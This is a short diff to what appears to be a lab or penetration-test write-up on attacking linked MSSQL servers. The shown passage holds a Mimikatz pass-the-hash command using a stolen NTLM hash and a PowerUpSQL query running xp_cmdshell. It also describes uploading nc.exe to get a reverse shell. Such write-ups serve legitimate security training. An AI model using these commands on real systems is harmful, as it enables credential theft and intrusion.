@@ -18,9 +18,7 @@ the IsSysAdmin:0 means that we will not be allowed to enable xp_cmdshell. Luckil
 of our USER machine, we acquired the NTLM hash of reportuser. Using Over pass the hash method we 
 can get a powershell prompt in the context of reportuser.
 ```
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:reportuser 
-/domain:[domain] /ntlm:[hash] 
-/run:powershell.exe"'
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:reportuser /domain:[domain] /ntlm:[hash] /run:powershell.exe"'
 ```
 We re-run our PowerUpSQL commands, and can see that reportuser has IsSysAdmin:1, allowing us to 
 enable xp_cmdshell and successfully get a reverse shell
@@ -30,8 +28,7 @@ Get-SQLServerLinkCrawl -Instance [instance] -verbose
 Now we can try running Queries to get code execution, we test with running whoami and can see that 
 we are running as user\admin.
 ```
-Get-SQLServerLinkCrawl -Instance [instance] -Query 
-'exec master..xp_cmdshell "whoami"'
+Get-SQLServerLinkCrawl -Instance [instance] -Query 'exec master..xp_cmdshell "whoami"'
 ```
 Now let’s try to upload nc.exe to the C:\Windows\Temp folder and execute it to give us a reverse shell 
 as devsqladmin
